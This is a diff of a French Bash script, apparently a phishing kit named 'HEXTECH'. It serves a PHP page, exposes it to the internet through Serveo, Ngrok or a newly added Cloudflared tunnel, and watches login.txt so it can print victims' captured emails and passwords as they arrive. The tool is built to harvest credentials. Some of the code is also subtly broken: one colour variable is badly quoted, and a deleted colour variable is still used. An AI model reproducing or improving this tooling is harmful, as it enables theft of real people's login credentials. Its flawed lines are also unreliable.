@@ -6,13 +6,13 @@ JAUNE='\033[1;33m\033[1;4m'
 ROUGE='\033[1;31m\033[1;3m'
 VERT='\033[1;32m\033[1;2m'
 CYAN='\033[1;36m\033[1;1m'
-MAGENTA='\033[1;35m\033[1;6m'
+RED=\033[1;31m\033[1;6m''
 NC='\033[0m' # Pas de couleur
 
 # Animation ASCII
 animation() {
     clear
-    echo -e "${MAGENTA}"
+    echo -e "${RED}"
     echo -e " ██╗  ██╗███████╗██╗  ██╗████████╗███████╗ ██████╗██╗  ██╗"
     echo -e " ██║  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║"
     echo -e " ███████║█████╗   ╚███╔╝    ██║   █████╗  ██║     ███████║"
@@ -28,7 +28,7 @@ animation() {
     sleep 1
 }
 
-# Fonction pour afficher les données de connexion (email et password uniquement)
+# Fonction simplifiée pour afficher seulement email et password
 afficher_donnees() {
     echo -e "\n${CYAN}═════════ CONNEXION DÉTECTÉE ═════════${NC}"
     while IFS= read -r ligne || [[ -n "$ligne" ]]; do
@@ -40,16 +40,13 @@ afficher_donnees() {
             *password:*|*Password:*|*[Mm]ot\ de\ passe:*)
                 echo -e "${VERT}🔑 Mot de passe: ${NC}${ligne_clean#*: }"
                 ;;
-            *IP:*|*ip:*)
-                echo -e "${VERT}🌐 IP: ${NC}${ligne_clean#*: }"
-                ;;
         esac
     done < login.txt
     echo -e "${CYAN}══════════════════════════════════════${NC}"
     echo -e "${ROUGE}🚨 nano login.txt pour voir tous les détails 🚨${NC}\n"
 }
 
-# Fonction pour surveiller les données en temps réel
+# Surveillance des données en temps réel
 surveiller_donnees() {
     echo -e "${VERT}[•] Surveillance des connexions en temps réel...${NC}"
     echo -e "${JAUNE}Appuyez sur ${ROUGE}Ctrl+C${JAUNE} pour arrêter${NC}"
@@ -77,7 +74,7 @@ surveiller_donnees() {
     done
 }
 
-# Démarrer le serveur PHP avec le script de récupération
+# Démarrer le serveur PHP avec le script intégré
 demarrer_serveur_php() {
     echo -e "${BLEU}[•] Démarrage du serveur PHP...${NC}"
     
@@ -198,6 +195,23 @@ generer_lien_serveo() {
     }
 }
 
+# Générer lien Cloudflared
+generer_lien_cloudflared() {
+    echo -e "${JAUNE}[•] Démarrage avec Cloudflared...${NC}"
+    if ! command -v cloudflared &> /dev/null; then
+        echo -e "${ROUGE}[!] Cloudflared n'est pas installé. Installation...${NC}"
+        pkg install cloudflared -y || {
+            echo -e "${ROUGE}[!] Échec installation Cloudflared${NC}"
+            exit 1
+        }
+    fi
+    echo -e "${CYAN}==================================================${NC}"
+    cloudflared tunnel --url http://localhost:8080 || {
+        echo -e "${ROUGE}[!] Erreur Cloudflared${NC}"
+        exit 1
+    }
+}
+
 # Vérifier les dépendances
 verifier_dependances() {
     echo -e "${CYAN}[•] Vérification des outils...${NC}"
@@ -236,7 +250,8 @@ menu_principal() {
                 echo -e "${CYAN}Méthode de tunneling :${NC}"
                 echo -e "${VERT}1. ${BLEU}Serveo (SSH)${NC}"
                 echo -e "${VERT}2. ${JAUNE}Ngrok${NC}"
-                read -p "Votre choix (1-2) : " methode
+                echo -e "${VERT}3. ${MAGENTA}Cloudflared${NC}"
+                read -p "Votre choix (1-3) : " methode
 
                 verifier_dependances
                 demarrer_serveur_php &
@@ -244,6 +259,7 @@ menu_principal() {
                 case $methode in
                     1) generer_lien_serveo ;;
                     2) generer_lien_ngrok ;;
+                    3) generer_lien_cloudflared ;;
                     *) echo -e "${ROUGE}Option invalide${NC}"; continue ;;
                 esac
                 ;;
